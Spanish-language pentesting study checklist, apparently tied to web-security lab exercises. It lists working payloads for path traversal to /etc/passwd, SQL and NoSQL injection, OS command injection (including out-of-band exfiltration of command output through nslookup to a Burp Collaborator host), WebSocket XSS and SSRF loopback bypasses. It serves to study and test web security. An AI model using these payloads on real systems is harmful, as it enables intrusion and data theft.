
### **Path traversal**

###### ***Comprobaciones***

- [ ] Cuando la sanitizacion quita el path traversal puntar al archivo directamente
- [ ] `....//`o `....\/`
- [ ] ``..%252f..%252f..%252fetc/passwd``, `%2e%2e%2f`y `%252e%252e%252f`, `..%c0%af`, `..%ef%bc%8f`
- [ ] Burp Pofesional - Intruder - Diccionario de rutas predefinido
- [ ] Carpeta / directorio requerida ``filename=/var/www/images/../../../etc/passwd``
- [ ] NullByte si el servidor requiere una extension ``/etc/passwd%00.png``

--------------------------
### **Authentication vulnerabilities** 

###### ***Login***

- [ ] Cookie ``stay-logged-in`` - Mantenerse conectado [[4. Brute Force Cookie]]
- [ ] Funcion de resetear la password [[6. Reset password function]]
###### ***Bypass Blocks***

- [ ] Bypass block ban [[1. Brute force and block ban]]
- [ ] Bypass IP block [[2. Broken brute-force protection, IP block]]
- [ ] Bypass bloqueo de cuenta [[3. Bloqueo de cuenta - Longitud respuesta]]
- [ ] Bypass doble factor autenticacion [[Saltarse doble factor de authenticacion]]

-------------------------------
### **SQL Injection**

###### ***Comprobaciones***

- [ ] ``'``
- [ ] ``"`` 
- [ ] `' or 1=1-- -` - Union based
- [ ] `' and sleep(5)-- -` - Union based
- [ ] `''` 
- [ ] `' and 1=1-- -` - Conditional error
- [ ] `' and '1'='2` - Conditional error
- [ ] `' and (select 'a')='a` - Conditional error
- [ ] `' AND '1'='1` - Conditional response
- [ ] `' AND '1'='2` - Conditional response
- [ ] Time based
	- [ ] Microsoft SQL
		- [ ] `'; IF (1=1) WAITFOR DELAY '0:0:10'--` - NO provoca un retraso en la respuesta porque la condicion es verdadera
		- [ ] `'; IF (1=1) WAITFOR DELAY '0:0:10'--` - SI provoca un retraso en la respuesta porque la condicion es falsa
	- [ ] Posgres SQL
		- [ ] `'||pg_sleep(10)-- -`
	- [ ] Mysql
		- [ ] `' OR 1=1 AND SLEEP(10) -- -` 

###### ***Tipos***

- [ ] Union based [[1.Sintaxis basica UNION]]
- [ ] Blind
	- [ ] Conditional error [[Explotacion Conditional Error]]
	- [ ] Conditional Response
		- [ ] Deteccion [[Deteccion Conditional Response]]
		- [ ] [[Explotacion Conditional Response]]
	- [ ] OAST [[out-of-band (OAST)]]
	- [ ] Time based Exploitation [[Explotacion Time Delays]]
- [ ] Oracle explotacion from dual - [[Hacking Apuntes/Gestores de contenido/Oracle/Oracle|Oracle]] 

###### ***En otros contextos***

- [ ] XML [[XML ofuscation]]

----------------------------------------
### **NoSQL Injection**

###### ***Comprobaciones - truncar consulta***

- [ ] ``'"`{`
- [ ] `;$Foo}`
- [ ] `$Foo \xYZ`
- [ ] `'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00` -> url-encode
- [ ] '\"`{\r;$Foo}\n$Foo \\xYZ\u0000`  -> json 
- [ ] Condicionales [[2. Comprobar si es condicional - booleanas]]
	- [ ] `' && 1 && 'x` - `' && '1'=='1`  -> Verdadera - Urlencodear
	- [ ] `' && 0 && 'x` - `' && '1'=='2`  -> Falsa - Urlencodear

###### ***Login***

- [ ] Operadores de consulta - LOGIN [[3. Operadores de consulta - Login]]
- [ ] Extraer datos [[4. Extraer datos]] 

-------------------------------
### **API** 

###### ***Identificar metodos y endpoints***

- [ ] Fuzzear API - Investigar las rutas
- [ ] Buscar archivos javascript que puedes contener endpoints - Se puede usar la extension BApp JS Link Finder
- [ ] Comprobar metodos compatibles ``HEAD - OPTIONS - PATCH - PUT - POST - GET`` - Podemos usar lista wordlist Burp 
	- [ ] Metodo PUT ``PUT /api/tasks/update`` tambien ``/delete`` o ``/add``
	- [ ] Metodo OPTIONS [[1. Identificar metodos]] - Cambiar Content-Type si a otro formato si nos lo pide con BApp convertidor
- [ ] Param Miner extension - Identificar parametros disponibles 

###### ***Vulnerablidades***

- [ ] Mass assignment vulnerabilities - Parametros ocultos [[2. Mass assignment vulnerabilities - Parametros ocultos]] 
- [ ] Server-side parameter pollution in REST paths [[3. Pruebas de contaminación de parámetros del lado del servidor en rutas REST - Server-side parameter pollution in REST paths]]
- [ ] Server-side parameter pollution [[4.Server-side parameter pollution]]

###### ***Otras***

- [ ] Borrar usuario de una API [[Borrar un usuario de una API]]

###### ***Extensiones Burp***

- [ ] Burp Scanner
- [ ] BApp Backslash Powered Scanner

---------------------------------------

### **OS Command Injection** 

###### ***Formas***

- [ ] Pipear `loquesea | whoami`
- [ ] Ping `||ping+-c+10+127.0.0.1||`
- [ ] Redirigir output a un archivo para despues apuntar a el `||whoami>/var/www/images/output.txt||`
- [ ] Blind OS Command Injection with out-of-band interaction `||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
- [ ] Blind OS command Injection with out-of-band data exfiltration `||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`

------------------------

### **WebSockets attaks**

###### ***Formas***

- [ ] WebSockets to XSS - Si el mensaje se envia en json se traduce en html, meter `{"message":"<img src=1 onerror='alert(1)'>"}`
- [ ]  WebSocket to CSRF [[WebSockets attaks]]

###### ***Bypass Block***

- [ ] Desde la peticion raiz del chat `X-Forwarded-For: 1.1.1.1`
- [ ] alert bypass `<img src=1 oNeRrOr=alert`1`>` 

----------------------

### **SSRF**

###### ***Deteccion***

- [ ] Cuando un parametro puede leer una url - Sabiendo la IP - Redireccionamos a `http://192.168.0.1/admin/delete?username=carlos`
- [ ] Fuzear la IP - Fuzzear el ultimo digito de la IP con intruder, el que salga codigo 200 es el bueno `http://192.168.0.x/admin`

###### ***Formas***

- [ ] Insertar en el Referer en la peticion para la carga de una pagina un carga de burp collaborator
- [ ] StockApi parameter `http://127.0.0.1` - Llamada a una API desde un parametro
	- [ ] Bypass block loopback `http://127.1/`
- [ ] Acces to admin panel `http://127.1/admin`
	- [ ] Ofuscation character `a` bypass block `http://127.1/%2561dmin`
- [ ] 




